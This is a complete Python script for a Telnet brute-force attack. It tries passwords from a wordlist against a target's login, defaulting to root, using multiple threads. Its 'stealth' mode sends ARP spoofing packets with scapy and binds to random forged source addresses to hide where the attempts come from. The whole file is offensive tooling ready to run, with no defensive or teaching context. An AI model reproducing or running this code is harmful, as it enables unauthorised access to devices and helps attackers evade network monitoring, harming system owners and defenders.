#!/usr/bin/env python3
# Telnet Brute Force Tool with Debug Logging

import argparse
import threading
import socket
import time
import os
import sys
import signal
import random
from telnetlib import Telnet
from scapy.all import ARP, send

RED    = "\033[38;2;255;0;0m"
GREEN  = "\033[38;2;0;255;0m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

stopEvent    = threading.Event()
stdoutLock   = threading.Lock()
attemptsDone = 0
startTime    = 0

def SignalHandler(sig, frame):
    print(f"\n{RED}Stopping brute force...{RESET}")
    stopEvent.set()
    sys.exit(0)

def FormatDuration(seconds):
    m, s = divmod(int(seconds), 60)
    h, m = divmod(m, 60)
    return f"{h:02}:{m:02}:{s:02}"

def PrintProgress(total):
    while not stopEvent.is_set():
        elapsed = time.time() - startTime
        with stdoutLock:
            print(f"\r{RED}Attempts: {attemptsDone}/{total} | Duration: {FormatDuration(elapsed)}{RESET}", end="")
        time.sleep(1)

def AttemptLogin(host, port, username, password, sourceIp=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if sourceIp:
        try:
            sock.bind((sourceIp, 0))
        except OSError:
            return False
    sock.settimeout(5)
    try:
        sock.connect((host, port))
        tn = Telnet()
        tn.sock = sock
        tn.read_until(b"login: ", timeout=3)
        tn.write(username.encode() + b"\n")
        tn.read_until(b"Password: ", timeout=3)
        tn.write(password.encode() + b"\n")

        time.sleep(2)
        tn.write(b"echo __BRUTE_OK__\n")
        time.sleep(1)

        out = tn.read_very_eager().decode(errors="ignore")
        tn.close()

        print(f"{RED}DEBUG OUTPUT for '{password}':\n{out}{RESET}")

        return "__BRUTE_OK__" in out

    except Exception as e:
        print(f"{RED}DEBUG Exception for '{password}': {e}{RESET}")
        return False
    finally:
        sock.close()

def ArpSpoofOnce(targetIp, fakeIp, iface):
    pkt = ARP(op=2, pdst=targetIp, psrc=fakeIp, hwdst="ff:ff:ff:ff:ff:ff")
    send(pkt, iface=iface, verbose=False)

def WorkerNormal(host, port, username, passwords, delay):
    global attemptsDone
    print("DEBUG: WorkerNormal starting")
    for pwd in passwords:
        if stopEvent.is_set():
            print("DEBUG: WorkerNormal detected stopEvent, exiting")
            break
        print(f"DEBUG: attempting '{pwd}'")
        ok = AttemptLogin(host, port, username, pwd)
        print(f"DEBUG: AttemptLogin returned {ok}")
        if ok:
            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
            stopEvent.set()
            break
        with stdoutLock:
            attemptsDone += 1
        time.sleep(delay)

def WorkerStealth(host, port, username, passwords, subnetPrefix, iface, delay):
    global attemptsDone
    print("DEBUG: WorkerStealth starting")
    for pwd in passwords:
        if stopEvent.is_set():
            print("DEBUG: WorkerStealth detected stopEvent, exiting")
            break
        fakeIp = f"{subnetPrefix}.{random.randint(2,254)}"
        print(f"DEBUG: ARP spoofing {fakeIp}")
        ArpSpoofOnce(host, fakeIp, iface)
        ok = AttemptLogin(host, port, username, pwd, sourceIp=fakeIp)
        print(f"DEBUG: AttemptLogin returned {ok}")
        if ok:
            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
            stopEvent.set()
            break
        with stdoutLock:
            attemptsDone += 1
        time.sleep(delay)

def StartAttack(host, port, username, passwords, mode, subnetPrefix, iface, threadsCount, delay):
    global startTime, attemptsDone
    stopEvent.clear()
    startTime = time.time()
    attemptsDone = 0
    total = len(passwords)

    prog = threading.Thread(target=PrintProgress, args=(total,), daemon=True)
    prog.start()

    slices = [passwords[i::threadsCount] for i in range(threadsCount)]
    threads = []
    for i in range(threadsCount):
        if mode == "stealth":
            t = threading.Thread(
                target=WorkerStealth,
                args=(host, port, username, slices[i], subnetPrefix, iface, delay)
            )
        else:
            t = threading.Thread(
                target=WorkerNormal,
                args=(host, port, username, slices[i], delay)
            )
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    elapsed = time.time() - startTime
    print(f"\n{RED}Attack complete. Total attempts: {attemptsDone} | Duration: {FormatDuration(elapsed)}{RESET}")

def menu():
    host      = input(f"{RED}Target IP: {RESET}").strip()
    port      = int(input(f"{RED}Port [23]: {RESET}") or "23")
    username  = input(f"{RED}Username [root]: {RESET}").strip() or "root"
    threads   = int(input(f"{RED}Threads [10]: {RESET}") or "10")
    delay     = float(input(f"{RED}Delay between attempts (s) [1.0]: {RESET}") or "1.0")
    wl = os.path.join(os.path.dirname(__file__), "passwords.txt")
    if not os.path.exists(wl):
        print(f"{RED}passwords.txt not found{RESET}")
        return
    with open(wl) as f:
        passwords = [l.strip() for l in f if l.strip()]

    choice = input(f"{RED}Mode: [1] Normal [2] Stealth (ARP spoof): {RESET}").strip()
    if choice == "2":
        subnet = input(f"{RED}Subnet prefix (e.g. 192.168.1): {RESET}").strip()
        iface  = input(f"{RED}Interface (e.g. eth0): {RESET}").strip()
        StartAttack(host, port, username, passwords, "stealth", subnet, iface, threads, delay)
    else:
        StartAttack(host, port, username, passwords, "normal", None, None, threads, delay)

def terminal():
    p = argparse.ArgumentParser(description="Telnet Brute Force Tool")
    p.add_argument("-i","--host",    required=True)
    p.add_argument("-P","--port",    type=int, default=23)
    p.add_argument("-u","--username",default="root")
    p.add_argument("-m","--mode",    choices=["normal","stealth"], default="normal")
    p.add_argument("--subnet",       help="Subnet prefix for stealth")
    p.add_argument("--iface",        help="Interface for stealth")
    p.add_argument("-t","--threads", type=int, default=10)
    p.add_argument("-d","--delay",   type=float, default=1.0)
    args = p.parse_args()

    wl = os.path.join(os.path.dirname(__file__), "passwords.txt")
    if not os.path.exists(wl):
        print(f"{RED}passwords.txt not found{RESET}")
        return
    with open(wl) as f:
        passwords = [l.strip() for l in f if l.strip()]

    StartAttack(
        args.host, args.port, args.username,
        passwords, args.mode,
        args.subnet, args.iface,
        args.threads, args.delay
    )

if __name__ == "__main__":
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()
